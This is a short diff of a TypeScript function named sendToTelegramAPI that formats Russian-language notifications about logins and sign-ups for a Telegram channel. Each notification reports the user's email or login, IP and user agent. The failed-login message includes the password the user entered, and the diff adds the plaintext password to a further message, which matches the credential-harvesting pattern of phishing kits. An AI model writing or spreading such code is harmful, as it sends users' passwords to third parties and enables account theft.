@@ -15,7 +15,7 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 
 👤 Логин/Email: ${data.login}
 
-🌐 **Данные:**
+🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
 📱 User Agent: ${userAgent.slice(0, 100)}...
@@ -28,7 +28,7 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 🔑 Введенный пароль: ${data.password}
 🚫 Причина: ${error}
 
-🌐 **Данные:**
+🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
 📱 User Agent: ${userAgent.slice(0, 100)}...
@@ -39,8 +39,9 @@ async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_faile
 
 📧 Email: ${data.email}
 👤 Логин: ${data.login}
+🔑 Пароль: ${data.password}
 
-🌐 **Данные:**
+🌐 **Серверные данные:**
 📍 IP: ${ip}
 🕒 Время: ${new Date().toLocaleString('ru-RU')}
 📱 User Agent: ${userAgent.slice(0, 100)}...
